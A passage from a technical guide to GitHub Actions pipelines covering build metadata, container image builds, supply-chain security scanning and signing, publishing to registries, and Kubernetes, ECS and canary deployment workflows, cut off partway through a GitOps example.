| `mvn -B` (`--batch-mode`) | No ANSI/interactive output |
| `mvn -ntp` (`--no-transfer-progress`) | Removes thousands of download-progress lines |
| `mvn -T 1C` | Parallel build, one thread per core |
| `mvn --fail-at-end` | See all module failures, not just the first |
| `gradle --no-daemon` | The daemon is pointless on an ephemeral runner |
| `gradle --build-cache` | With `gradle/actions/setup-gradle` |
| `go build -trimpath -ldflags="-s -w -X main.version=$VERSION"` | Reproducible, smaller, version-stamped |

### 30.2 Embedding build metadata

Every artifact should be able to tell you where it came from.

```yaml
      - run: |
          go build -trimpath \
            -ldflags "-s -w \
              -X main.version=${{ steps.meta.outputs.version }} \
              -X main.commit=${GITHUB_SHA} \
              -X main.buildTime=$(date -u +%Y-%m-%dT%H:%M:%SZ) \
              -X main.buildRun=${GITHUB_RUN_ID}" \
            -o bin/api ./cmd/api
```

For Spring Boot, the build-info plugin does this automatically and exposes it on `/actuator/info`:

```xml
<plugin>
  <groupId>org.springframework.boot</groupId>
  <artifactId>spring-boot-maven-plugin</artifactId>
  <executions>
    <execution><goals><goal>build-info</goal></goals></execution>
  </executions>
</plugin>
```

🧠 On a production incident, the first question is "which version is running?" The second is "which commit is that?" Build metadata answers both in five seconds.

### 30.3 Container image build

```yaml
  image:
    needs: build
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write
      id-token: write
      attestations: write
    outputs:
      digest: ${{ steps.push.outputs.digest }}
      tags: ${{ steps.meta.outputs.tags }}
    steps:
      - uses: actions/checkout@v7

      - uses: actions/download-artifact@v8
        with: { name: app-jar, path: target }

      - uses: docker/setup-buildx-action@v4

      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - id: meta
        uses: docker/metadata-action@v6
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha,format=long
            type=raw,value=latest,enable={{is_default_branch}}
          labels: |
            org.opencontainers.image.title=${{ github.event.repository.name }}
            org.opencontainers.image.revision=${{ github.sha }}

      - id: push
        uses: docker/build-push-action@v7
        with:
          context: .
          file: ./Dockerfile
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true
          sbom: true
          build-args: |
            VERSION=${{ needs.build.outputs.version }}

      - uses: actions/attest-build-provenance@v4
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
```

`docker/metadata-action` is genuinely worth the dependency: it produces a correct, consistent tag set from the event context, and handles semver parsing, default-branch detection and OCI labels.

### 30.4 The digest is the real identity

```yaml
      - run: echo "Pushed ${{ steps.push.outputs.digest }}"
```

🧠 **Tags are mutable, digests are not.** `ghcr.io/org/api:v1.4.2` can be repointed. `ghcr.io/org/api@sha256:abc...` cannot. Pass the *digest* between jobs and deploy by digest. Tags are for humans.

### 30.5 Multi-architecture builds

```yaml
      - uses: docker/setup-qemu-action@v4
      - uses: docker/setup-buildx-action@v4
      - uses: docker/build-push-action@v7
        with:
          platforms: linux/amd64,linux/arm64
          push: true
          tags: ${{ steps.meta.outputs.tags }}
```

⚠️ QEMU emulation for the non-native architecture is **slow** — often 5–10× slower. For heavy builds, use native runners per arch and merge the manifests:

```yaml
jobs:
  build:
    strategy:
      matrix:
        include:
          - platform: linux/amd64
            runner: ubuntu-24.04
          - platform: linux/arm64
            runner: ubuntu-24.04-arm
    runs-on: ${{ matrix.runner }}
    steps:
      - uses: docker/build-push-action@v7
        id: build
        with:
          platforms: ${{ matrix.platform }}
          outputs: type=image,name=ghcr.io/${{ github.repository }},push-by-digest=true,name-canonical=true,push=true
      - run: |
          mkdir -p /tmp/digests
          touch "/tmp/digests/${DIGEST#sha256:}"
        env:
          DIGEST: ${{ steps.build.outputs.digest }}
      - uses: actions/upload-artifact@v7
        with:
          name: digests-${{ strategy.job-index }}
          path: /tmp/digests/*

  merge:
    needs: build
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/download-artifact@v8
        with: { pattern: digests-*, path: /tmp/digests, merge-multiple: true }
      - uses: docker/setup-buildx-action@v4
      - id: meta
        uses: docker/metadata-action@v6
        with: { images: ghcr.io/${{ github.repository }} }
      - working-directory: /tmp/digests
        run: |
          docker buildx imagetools create \
            $(jq -cr '.tags | map("-t " + .) | join(" ")' <<< "$DOCKER_METADATA_OUTPUT_JSON") \
            $(printf 'ghcr.io/${{ github.repository }}@sha256:%s ' *)
```

### 30.6 Dockerfile patterns for fast CI builds

```dockerfile
# syntax=docker/dockerfile:1.7

# ---- dependency layer (changes rarely) ----
FROM maven:3.9-eclipse-temurin-21 AS deps
WORKDIR /build
COPY pom.xml .
COPY */pom.xml ./
RUN --mount=type=cache,target=/root/.m2 \
    mvn -B -ntp dependency:go-offline

# ---- build layer (changes every commit) ----
FROM deps AS build
COPY src ./src
ARG VERSION=dev
RUN --mount=type=cache,target=/root/.m2 \
    mvn -B -ntp package -DskipTests -Drevision=${VERSION}

# ---- runtime layer (tiny, no build tools) ----
FROM eclipse-temurin:21-jre-alpine AS runtime
RUN addgroup -S app && adduser -S app -G app
WORKDIR /app
COPY --from=build --chown=app:app /build/target/*.jar app.jar
USER app
EXPOSE 8080
HEALTHCHECK --interval=30s --timeout=3s --start-period=40s \
  CMD wget -qO- http://localhost:8080/actuator/health/readiness || exit 1
ENTRYPOINT ["java","-XX:MaxRAMPercentage=75","-jar","/app/app.jar"]
```

Wins: `--mount=type=cache` for the Maven repo, dependency layer before source layer, multi-stage so the runtime image contains no compiler, non-root user, and a healthcheck.

### 30.7 Reproducible builds

Two builds of the same commit should produce byte-identical artifacts.

```yaml
      - run: |
          export SOURCE_DATE_EPOCH="$(git log -1 --pretty=%ct)"
          mvn -B -ntp package \
            -Dproject.build.outputTimestamp="$(date -u -d @$SOURCE_DATE_EPOCH +%Y-%m-%dT%H:%M:%SZ)"
```

```yaml
      - uses: docker/build-push-action@v7
        with:
          build-args: |
            SOURCE_DATE_EPOCH=${{ steps.meta.outputs.epoch }}
          outputs: type=image,rewrite-timestamp=true
```

Why bother: reproducibility means you can independently verify that a published binary came from a claimed source commit. It is a compliance requirement in some sectors and a genuine security property everywhere.

---

## Chapter 31 — Category D: Security and Supply Chain

**Purpose:** find vulnerabilities and policy violations before they reach production, and prove the integrity of what you ship.

### 31.1 The layers

```mermaid
flowchart TD
    subgraph CODE["Your code"]
        SAST["SAST — CodeQL, Semgrep<br/>finds vulnerable patterns in source"]
        SEC["Secret scanning<br/>finds committed credentials"]
    end
    subgraph DEPS["Your dependencies"]
        SCA["SCA — Dependabot, OSV, Snyk<br/>finds known CVEs in libraries"]
        LIC["License compliance<br/>finds forbidden licences"]
        DR["Dependency review<br/>blocks new vulnerable deps in a PR"]
    end
    subgraph ART["Your artifacts"]
        CS["Container scanning — Trivy, Grype<br/>finds CVEs in OS packages + libs"]
        SBOM["SBOM generation<br/>records exactly what is inside"]
        SIGN["Signing — cosign / Sigstore<br/>proves who built it"]
        PROV["Provenance attestation<br/>proves how it was built"]
    end
    subgraph INFRA["Your infrastructure"]
        IAC["IaC scanning — Checkov, tfsec, KICS"]
        K8S["Kubernetes manifest policy — OPA, Kyverno"]
    end
    subgraph PIPE["Your pipeline itself"]
        PIN["Action pinning"]
        PERM["Least-privilege permissions"]
        EGR["Egress filtering — harden-runner"]
        POL["Execution protections"]
    end
```

### 31.2 CodeQL (SAST)

```yaml
# .github/workflows/codeql.yml
name: CodeQL
on:
  push: { branches: [main] }
  pull_request: { branches: [main] }
  schedule: [{ cron: '0 6 * * 1' }]     # weekly deep scan

permissions:
  contents: read

jobs:
  analyze:
    name: Analyze ${{ matrix.language }}
    runs-on: ${{ matrix.language == 'swift' && 'macos-latest' || 'ubuntu-24.04-8-cores' }}
    timeout-minutes: 60
    permissions:
      security-events: write
      packages: read
      actions: read
      contents: read
    strategy:
      fail-fast: false
      matrix:
        include:
          - language: java-kotlin
            build-mode: autobuild
          - language: go
            build-mode: autobuild
          - language: actions           # scans your workflow files for vulnerabilities
            build-mode: none
    steps:
      - uses: actions/checkout@v7

      - uses: github/codeql-action/init@v4
        with:
          languages: ${{ matrix.language }}
          build-mode: ${{ matrix.build-mode }}
          queries: security-extended,security-and-quality

      - uses: github/codeql-action/analyze@v4
        with:
          category: /language:${{ matrix.language }}
```

🧠 The `actions` language is worth enabling: CodeQL now has dedicated queries for GitHub Actions security problems — script injection, unpinned actions, dangerous `pull_request_target` patterns. It scans *your pipeline* for the vulnerabilities in Chapter 48.

⚠️ CodeQL on a large Java codebase is slow (20–60 min). Run it on `push: main` and weekly, not on every PR, or use a larger runner. On PRs, `security-extended` on changed files only via the default setup is usually the right trade.

### 31.3 Dependency review — block new vulnerable dependencies

```yaml
  dependency-review:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@v7
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0, SSPL-1.0
          comment-summary-in-pr: always
          allow-ghsas: GHSA-xxxx-yyyy-zzzz    # documented exceptions only
```

This diffs the dependency manifest between base and head and fails if the PR *introduces* a vulnerable or badly-licensed dependency. Fast (seconds), high signal, and it stops the bleeding even if your existing backlog of CVEs is large.

### 31.4 Dependabot

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: maven
    directory: "/"
    schedule: { interval: weekly, day: monday, time: "06:00", timezone: "Asia/Kolkata" }
    open-pull-requests-limit: 10
    groups:
      spring:
        patterns: ["org.springframework*"]
      test-deps:
        patterns: ["*junit*", "*mockito*", "*testcontainers*"]
        update-types: [minor, patch]
      all-patch:
        update-types: [patch]
    ignore:
      - dependency-name: "com.legacy:frozen-lib"
        update-types: ["version-update:semver-major"]
    labels: [dependencies, automated]
    commit-message:
      prefix: "chore(deps)"

  - package-ecosystem: github-actions
    directory: "/"
    schedule: { interval: weekly }
    groups:
      actions:
        patterns: ["*"]

  - package-ecosystem: docker
    directory: "/"
    schedule: { interval: weekly }
```

🧠 **Group aggressively.** Ungrouped Dependabot produces 30 PRs a week and everyone ignores them. Grouped, you get 3 PRs a week and people actually merge them.

Auto-merge patch updates that pass CI:

```yaml
# .github/workflows/dependabot-automerge.yml
name: Dependabot auto-merge
on: pull_request

permissions:
  contents: write
  pull-requests: write

jobs:
  automerge:
    if: github.actor == 'dependabot[bot]'
    runs-on: ubuntu-24.04
    steps:
      - id: meta
        uses: dependabot/fetch-metadata@v2
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - if: steps.meta.outputs.update-type == 'version-update:semver-patch'
        run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

⚠️ `--auto` enables auto-merge, which still waits for required checks. Never merge unconditionally.

### 31.5 Container image scanning

```yaml
  scan-image:
    needs: image
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: read
      security-events: write
    steps:
      - name: Trivy scan (SARIF for code scanning)
        uses: aquasecurity/trivy-action@0.36.0
        with:
          image-ref: ghcr.io/${{ github.repository }}@${{ needs.image.outputs.digest }}
          format: sarif
          output: trivy.sarif
          severity: CRITICAL,HIGH
          ignore-unfixed: true

      - uses: github/codeql-action/upload-sarif@v4
        with:
          sarif_file: trivy.sarif
          category: trivy-image

      - name: Trivy gate (fail the build)
        uses: aquasecurity/trivy-action@0.36.0
        with:
          image-ref: ghcr.io/${{ github.repository }}@${{ needs.image.outputs.digest }}
          format: table
          exit-code: '1'
          severity: CRITICAL
          ignore-unfixed: true
```

🧠 The two-step pattern — **report everything, fail on a narrow subset** — is the practical compromise. Uploading SARIF gives you a tracked backlog in the Security tab; a hard gate only on unfixed CRITICAL keeps the pipeline usable.

Use a `.trivyignore` with **expiry dates and justifications** for accepted risks:

```
# CVE-2024-12345 - only exploitable via the XML parser we don't use.
# Reviewed: 2026-08-01, expires: 2026-11-01, owner: @platform-team
CVE-2024-12345
```

### 31.6 SBOM generation

```yaml
      - uses: anchore/sbom-action@v0
        with:
          image: ghcr.io/${{ github.repository }}@${{ needs.image.outputs.digest }}
          format: cyclonedx-json
          output-file: sbom.cdx.json

      - uses: actions/attest-sbom@v3
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ needs.image.outputs.digest }}
          sbom-path: sbom.cdx.json
          push-to-registry: true
```

Why it matters: when the next Log4Shell happens, the question is "which of our 200 services contain the vulnerable version?" With SBOMs attached to every image, that is a query. Without them, it is a week of archaeology.

### 31.7 Signing with cosign

```yaml
      - uses: sigstore/cosign-installer@v4

      - name: Sign the image (keyless, via OIDC)
        env:
          DIGEST: ${{ needs.image.outputs.digest }}
        run: |
          cosign sign --yes "ghcr.io/${{ github.repository }}@${DIGEST}"
```

Keyless signing uses the job's OIDC identity and records the signature in the Rekor transparency log. No keys to manage.

Verify at deploy time — this is the point of the exercise:

```yaml
      - run: |
          cosign verify \
            --certificate-identity-regexp "^https://github.com/my-org/my-service/.github/workflows/.*" \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            "ghcr.io/my-org/my-service@${DIGEST}"
```

Better still: enforce it in the cluster with a Kyverno or Sigstore Policy Controller admission policy, so an unsigned image simply cannot run.

### 31.8 The complete supply chain picture

```mermaid
sequenceDiagram
    participant S as Source commit
    participant W as Build workflow
    participant R as Registry
    participant T as Rekor transparency log
    participant K as Kubernetes admission

    S->>W: triggers build
    W->>W: build image, generate SBOM
    W->>R: push image → digest
    W->>W: request OIDC token (id-token: write)
    W->>T: cosign sign (keyless) → signature + cert
    W->>R: attach SBOM attestation
    W->>R: attach SLSA provenance attestation
    Note over K: Deploy time
    K->>R: fetch image + attestations
    K->>T: verify signature against transparency log
    K->>K: check provenance: built by my-org/my-service workflow?
    K->>K: check SBOM: no denied licences?
    alt all checks pass
        K->>K: admit pod
    else any check fails
        K->>K: REJECT
    end
```

### 31.9 Secret scanning and IaC scanning

```yaml
  secrets-scan:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
        with: { fetch-depth: 0 }
      - uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  iac-scan:
    runs-on: ubuntu-24.04
    permissions: { security-events: write, contents: read }
    steps:
      - uses: actions/checkout@v7
      - uses: bridgecrewio/checkov-action@master
        with:
          directory: infra/
          framework: terraform,kubernetes,dockerfile
          output_format: sarif
          output_file_path: checkov.sarif
          soft_fail: true
      - uses: github/codeql-action/upload-sarif@v4
        with: { sarif_file: checkov.sarif, category: checkov }
```

Also enable GitHub's native **secret scanning with push protection** in repo settings — it blocks the commit before it lands, which is far better than finding it afterwards.

### 31.10 Runtime hardening of the runner itself

```yaml
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443
            objects.githubusercontent.com:443
            repo.maven.apache.org:443
            ghcr.io:443
            pkg-containers.githubusercontent.com:443
          disable-sudo: true
          disable-file-monitoring: false
```

This blocks all outbound network traffic except an allowlist, and monitors file writes and process execution. If a compromised dependency tries to POST your secrets to an attacker's server, it is blocked and reported.

Start with `egress-policy: audit` for a week to learn your real endpoint set, then switch to `block`.

---

## Chapter 32 — Category E: Publishing to Artifact and Container Registries

**Purpose:** put the artifact somewhere durable, addressable and access-controlled, so deployment and consumption can pull it rather than rebuild it.

### 32.1 When to push where

```mermaid
flowchart TD
    Q{"What did you build?"}
    Q -->|"A deployable service"| CI["Container image<br/>→ GHCR / ECR / Artifact Registry / ACR"]
    Q -->|"A library other code imports"| LIB{"Which ecosystem?"}
    Q -->|"A CLI binary for humans"| REL["GitHub Release assets<br/>+ Homebrew tap / apt repo"]
    Q -->|"Just a CI intermediate"| ART["Actions artifact<br/>(short retention)"]
    Q -->|"A Helm chart"| OCI["OCI registry as Helm repo"]
    Q -->|"An IaC module"| TFR["Terraform registry / git tag"]

    LIB -->|"Java"| MVN["Maven Central / GitHub Packages / Nexus / Artifactory"]
    LIB -->|"Go"| GOM["Just tag the repo.<br/>The proxy does the rest"]
    LIB -->|"JS"| NPM["npm registry / GitHub Packages"]
    LIB -->|"Python"| PY["PyPI"]
```

### 32.2 GHCR — the default for GitHub-native teams

```yaml
      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}     # no extra secret needed
```

Requires `packages: write`. Images land at `ghcr.io/OWNER/REPO`. Visibility and retention are configured on the package, and you can link it to the repo so it inherits access.

### 32.3 AWS ECR with OIDC

```yaml
  push-ecr:
    permissions: { id-token: write, contents: read }
    runs-on: ubuntu-24.04
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-ecr-push
          aws-region: ap-south-1

      - id: ecr
        uses: aws-actions/amazon-ecr-login@v2

      - uses: docker/build-push-action@v7
        with:
          push: true
          tags: |
            ${{ steps.ecr.outputs.registry }}/my-service:${{ github.sha }}
            ${{ steps.ecr.outputs.registry }}/my-service:latest
```

Google Artifact Registry and Azure ACR follow exactly the same shape with `google-github-actions/auth` / `azure/login` plus a registry login step.

### 32.4 Publishing a Java library

**To GitHub Packages (easiest, internal use):**

```yaml
  publish:
    permissions: { contents: read, packages: write }
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with:
          distribution: temurin
          java-version: '21'
          server-id: github                       # matches <id> in pom.xml <distributionManagement>
          server-username: GITHUB_ACTOR
          server-password: GITHUB_TOKEN
      - run: mvn -B -ntp deploy -DskipTests
        env:
          GITHUB_ACTOR: ${{ github.actor }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**To Maven Central (public, requires GPG signing):**

```yaml
      - uses: actions/setup-java@v6
        with:
          distribution: temurin
          java-version: '21'
          server-id: central
          server-username: MAVEN_USERNAME
          server-password: MAVEN_PASSWORD
          gpg-private-key: ${{ secrets.GPG_PRIVATE_KEY }}
          gpg-passphrase: MAVEN_GPG_PASSPHRASE

      - run: mvn -B -ntp deploy -P release -DskipTests
        env:
          MAVEN_USERNAME: ${{ secrets.CENTRAL_TOKEN_USERNAME }}
          MAVEN_PASSWORD: ${{ secrets.CENTRAL_TOKEN_PASSWORD }}
          MAVEN_GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
```

⚠️ **Maven Central releases are immutable and permanent.** Never publish from a workflow that can run on an arbitrary branch. Gate it behind a `release` event and an environment with required reviewers.

### 32.5 npm and PyPI with trusted publishing

Both now support OIDC, which removes the stored token entirely:

```yaml
  publish-npm:
    permissions: { id-token: write, contents: read }
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: { node-version: '22', registry-url: 'https://registry.npmjs.org' }
      - run: npm ci && npm publish --provenance --access public
```

`--provenance` attaches a signed statement linking the package to this workflow run — visible on the npm package page.

```yaml
  publish-pypi:
    permissions: { id-token: write }
    environment: pypi
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/download-artifact@v8
        with: { name: dist, path: dist }
      - uses: pypa/gh-action-pypi-publish@release/v1   # no token needed
```

### 32.6 Helm charts to an OCI registry

```yaml
      - run: |
          helm registry login ghcr.io -u "${{ github.actor }}" -p "${{ secrets.GITHUB_TOKEN }}"
          helm package charts/my-service --version "${VERSION}" --app-version "${VERSION}"
          helm push "my-service-${VERSION}.tgz" "oci://ghcr.io/${{ github.repository_owner }}/charts"
```

### 32.7 Registry hygiene

💰 Registries grow without limit if you let them. Every commit to `main` pushing a `:sha-abc123` tag means thousands of images a year.

```yaml
# .github/workflows/registry-cleanup.yml
name: Registry cleanup
on:
  schedule: [{ cron: '0 4 * * 0' }]
  workflow_dispatch:

permissions:
  packages: write

jobs:
  prune:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/delete-package-versions@v5
        with:
          package-name: my-service
          package-type: container
          min-versions-to-keep: 50
          delete-only-untagged-versions: false
          ignore-versions: '^(v\\d+\\.\\d+\\.\\d+|latest|main)$'
```

Also: enable ECR lifecycle policies, GAR cleanup policies, or the equivalent on whichever registry you use. Retain tagged releases forever; expire SHA-tagged development images after 30–90 days.

---
## Chapter 33 — Category F: Deployment Workflows

**Purpose:** move a specific, already-built artifact into a running environment, safely and reversibly.

### 33.1 The non-negotiable rules

1. **Deploy an artifact, never a branch.** The input to a deploy is a digest or a version, not "whatever is on main right now".
2. **Same artifact everywhere.** Staging and production receive the identical digest.
3. **Every deploy is recorded.** Use `environment:` so GitHub creates a Deployment record with a URL and history.
4. **Never `cancel-in-progress: true`** on a deploy.
5. **Rollback is a first-class workflow**, not a scramble.
6. **Verify after deploying.** A deploy that "succeeded" because `kubectl apply` returned 0 is not a successful deploy.

### 33.2 Deployment strategies

```mermaid
flowchart TD
    subgraph RE["Recreate"]
        R1["Stop all v1"] --> R2["Start all v2"]
        R2 --> R3["Downtime: yes<br/>Simple, cheap"]
    end
    subgraph RO["Rolling"]
        O1["Replace pods in batches"] --> O2["Mixed v1+v2 during rollout"]
        O2 --> O3["Downtime: no<br/>Needs backward-compatible changes"]
    end
    subgraph BG["Blue / Green"]
        B1["Deploy v2 to idle stack"] --> B2["Smoke test idle stack"]
        B2 --> B3["Flip the load balancer"]
        B3 --> B4["Instant rollback: flip back<br/>Cost: 2x infrastructure"]
    end
    subgraph CA["Canary"]
        C1["Route 5% traffic to v2"] --> C2["Watch error rate + latency"]
        C2 --> C3{"Healthy?"}
        C3 -->|"yes"| C4["25% → 50% → 100%"]
        C3 -->|"no"| C5["Route 0% back to v1"]
    end
```

| Strategy | Downtime | Rollback speed | Infra cost | Use when |
|---|---|---|---|---|
| Recreate | Yes | Redeploy | 1× | Internal tools, batch jobs |
| Rolling | No | Rolling back (slow) | 1× | Default for stateless services |
| Blue/green | No | Instant | 2× | Low risk tolerance, DB-compatible changes |
| Canary | No | Fast | ~1.1× | High traffic, want real-user validation |
| Feature flag | No | Instant, per-user | 1× | Behaviour changes. **Deploy ≠ release** |

🧠 The most powerful idea here: **decouple deploy from release using feature flags.** Ship the code dark, then turn it on for 1% of users from a dashboard. Your deployment pipeline gets simpler and your risk drops dramatically.

### 33.3 Deploy to Kubernetes (rolling)

```yaml
# .github/workflows/deploy-k8s.yml
name: Deploy to Kubernetes

on:
  workflow_call:
    inputs:
      environment: { required: true, type: string }
      image:       { required: true, type: string }   # full ref including @sha256:...
      service:     { required: true, type: string }
      namespace:   { required: true, type: string }

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    environment:
      name: ${{ inputs.environment }}
      url: ${{ vars.SERVICE_URL }}
    permissions:
      contents: read
      id-token: write
      deployments: write
    concurrency:
      group: deploy-${{ inputs.service }}-${{ inputs.environment }}
      cancel-in-progress: false
    steps:
      - uses: actions/checkout@v7

      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
          role-session-name: deploy-${{ inputs.service }}-${{ github.run_id }}

      - name: Configure kubectl
        run: aws eks update-kubeconfig --name "${{ vars.CLUSTER_NAME }}" --region "${{ vars.AWS_REGION }}"

      - name: Verify image signature before deploying
        run: |
          curl -sSfL https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64 -o /usr/local/bin/cosign
          chmod +x /usr/local/bin/cosign
          cosign verify \
            --certificate-identity-regexp "^https://github.com/${{ github.repository }}/.github/workflows/.*" \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            "${{ inputs.image }}"

      - name: Render and apply
        run: |
          set -euo pipefail
          helm upgrade --install "${{ inputs.service }}" ./charts/${{ inputs.service }} \
            --namespace "${{ inputs.namespace }}" --create-namespace \
            --values "./charts/${{ inputs.service }}/values-${{ inputs.environment }}.yaml" \
            --set image.ref="${{ inputs.image }}" \
            --set labels.gitSha="${GITHUB_SHA}" \
            --set labels.runId="${GITHUB_RUN_ID}" \
            --atomic --timeout 10m --wait

      - name: Verify rollout
        run: |
          kubectl -n "${{ inputs.namespace }}" rollout status \
            "deployment/${{ inputs.service }}" --timeout=5m
          kubectl -n "${{ inputs.namespace }}" get pods -l "app=${{ inputs.service }}" -o wide

      - name: Smoke test
        run: |
          set -euo pipefail
          for i in $(seq 1 30); do
            if curl -fsS "${{ vars.SERVICE_URL }}/actuator/health/readiness" | grep -q '"status":"UP"'; then
              echo "Service healthy"
              exit 0
            fi
            sleep 5
          done
          echo "::error::Service did not become healthy"
          exit 1

      - name: Diagnostics on failure
        if: failure()
        run: |
          kubectl -n "${{ inputs.namespace }}" describe deployment "${{ inputs.service }}" || true
          kubectl -n "${{ inputs.namespace }}" get events --sort-by=.lastTimestamp | tail -50 || true
          kubectl -n "${{ inputs.namespace }}" logs -l "app=${{ inputs.service }}" --tail=200 --all-containers || true

      - name: Write deployment summary
        if: always()
        run: |
          {
            echo "## Deployment: ${{ inputs.service }} → ${{ inputs.environment }}"
            echo ""
            echo "| Field | Value |"
            echo "|---|---|"
            echo "| Image | \`${{ inputs.image }}\` |"
            echo "| Commit | \`${GITHUB_SHA}\` |"
            echo "| Actor | @${{ github.triggering_actor }} |"
            echo "| Result | ${{ job.status }} |"
          } >> "$GITHUB_STEP_SUMMARY"
```

`helm --atomic` is the key flag: if the release fails, Helm rolls back automatically. Combined with `--wait`, the workflow only reports success when pods are actually ready.

### 33.4 Blue/green on ECS

```yaml
      - name: Register new task definition
        id: taskdef
        run: |
          aws ecs describe-task-definition --task-definition "$FAMILY" \
            --query taskDefinition > td.json
          jq --arg IMG "${{ inputs.image }}" \
            '.containerDefinitions[0].image = $IMG
             | del(.taskDefinitionArn,.revision,.status,.requiresAttributes,
                   .compatibilities,.registeredAt,.registeredBy)' td.json > new-td.json
          ARN="$(aws ecs register-task-definition --cli-input-json file://new-td.json \
                 --query 'taskDefinition.taskDefinitionArn' --output text)"
          echo "arn=$ARN" >> "$GITHUB_OUTPUT"

      - name: Blue/green deploy via CodeDeploy
        run: |
          cat > appspec.json <<JSON
          {
            "version": 1,
            "Resources": [{
              "TargetService": {
                "Type": "AWS::ECS::Service",
                "Properties": {
                  "TaskDefinition": "${{ steps.taskdef.outputs.arn }}",
                  "LoadBalancerInfo": { "ContainerName": "app", "ContainerPort": 8080 }
                }
              }
            }]
          }
          JSON
          ID="$(aws deploy create-deployment \
            --application-name "$CD_APP" \
            --deployment-group-name "$CD_GROUP" \
            --revision "revisionType=AppSpecContent,appSpecContent={content='$(cat appspec.json)'}" \
            --query deploymentId --output text)"
          aws deploy wait deployment-successful --deployment-id "$ID"
```

### 33.5 Progressive canary with automated analysis

```yaml
# .github/workflows/deploy-canary.yml
name: Canary deploy

on:
  workflow_call:
    inputs:
      image: { required: true, type: string }

jobs:
  canary:
    strategy:
      max-parallel: 1
      matrix:
        weight: [5, 25, 50, 100]
    runs-on: ubuntu-24.04
    environment: production
    concurrency:
      group: canary-production
      cancel-in-progress: false
    steps:
      - uses: actions/checkout@v7
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}

      - name: Shift ${{ matrix.weight }}% of traffic
        run: |
          kubectl -n prod patch httproute api --type merge -p \
            "{\"spec\":{\"rules\":[{\"backendRefs\":[
               {\"name\":\"api-canary\",\"weight\":${{ matrix.weight }}},
               {\"name\":\"api-stable\",\"weight\":$((100 - ${{ matrix.weight }}))}]}]}}"

      - name: Bake
        run: sleep 300

      - name: Analyse SLOs
        run: |
          set -euo pipefail
          Q='sum(rate(http_requests_total{service="api",version="canary",status=~"5.."}[5m]))
             / sum(rate(http_requests_total{service="api",version="canary"}[5m]))'
          ERR="$(curl -sG "$PROM_URL/api/v1/query" --data-urlencode "query=$Q" \
                 | jq -r '.data.result[0].value[1] // "0"')"
          echo "Canary error rate: $ERR"
          awk -v e="$ERR" 'BEGIN { exit (e < 0.01) ? 0 : 1 }' || {
            echo "::error::Canary error rate ${ERR} exceeds 1% budget"
            exit 1
          }
        env:
          PROM_URL: ${{ vars.PROMETHEUS_URL }}

      - name: Abort — shift all traffic back to stable
        if: failure()
        run: |
          kubectl -n prod patch httproute api --type merge -p \
            '{"spec":{"rules":[{"backendRefs":[
               {"name":"api-canary","weight":0},
               {"name":"api-stable","weight":100}]}]}}'
          echo "::error::Canary aborted and rolled back"
```

`max-parallel: 1` with a matrix is a neat trick for a sequential progression with per-stage visibility in the UI.

🧠 In practice, most teams delegate this to Argo Rollouts or Flagger and let the workflow just update the desired image. That is usually the right call — progressive delivery controllers handle metric analysis, automatic abort, and traffic shaping far better than bash.

### 33.6 GitOps: the workflow does not deploy at all

```mermaid
sequenceDiagram
    participant CI as Build workflow
    participant Reg as Registry
    participant Cfg as Config repo
    participant Argo as Argo CD
    participant K8s as Cluster

    CI->>Reg: push image@digest
    CI->>Cfg: commit "api: image digest = sha256:abc"
    Note over Cfg: PR + review for production
    Cfg->>Argo: Argo detects the change
    Argo->>K8s: reconcile desired state
    Argo->>Cfg: report sync status
    CI->>Argo: (optional) wait for Healthy
```

```yaml
  bump-config:
    needs: image
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/create-github-app-token@v2
        id: app-token
        with:
          app-id: ${{ vars.BOT_APP_ID }}
          private-key: ${{ secrets.BOT_APP_PRIVATE_KEY }}
